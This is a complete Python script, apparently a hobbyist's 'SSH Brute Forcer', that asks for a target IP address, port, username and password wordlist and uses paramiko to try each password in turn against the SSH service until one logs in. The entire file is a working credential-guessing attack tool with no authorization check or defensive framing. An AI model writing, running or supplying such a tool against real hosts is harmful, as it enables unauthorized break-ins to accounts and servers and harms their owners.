import paramiko
import socket

def print_banner():
    print("=" * 40)
    print("      SSH Brute Forcer by LiZKi")
    print("=" * 40)

def ssh_bruteforce(host, port, username, password_list):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in password_list:
        password = password.strip()
        if not password:
            continue
        try:
            print(f"Trying password: {password}")
            client.connect(
                hostname=host,
                port=port,
                username=username,
                password=password,
                timeout=5,
                banner_timeout=5
            )
            print(f"\n[+] Success! Password found: {password}")
            client.close()
            return password
        except paramiko.AuthenticationException:
            print("[-] Authentication failed.")
        except paramiko.SSHException as sshException:
            print(f"[!] SSH error: {sshException}")
        except socket.timeout:
            print("[!] Connection timed out.")
        except Exception as e:
            print(f"[!] Exception: {e}")
    print("\n[-] Password not found in the list.")
    return None

if __name__ == "__main__":
    print_banner()
    try:
        host = input("Enter target IP address: ").strip()
        port_input = input("Enter SSH port (default 22): ").strip()
        port = int(port_input) if port_input else 22
        username = input("Enter username: ").strip()
        wordlist_path = input("Enter path to password wordlist file: ").strip()

        with open(wordlist_path, 'r') as file:
            passwords = file.readlines()

        ssh_bruteforce(host, port, username, passwords)

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
    except ValueError:
        print("[!] Invalid port number.")
    except FileNotFoundError:
        print("[!] Wordlist file not found. Please check the path.")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
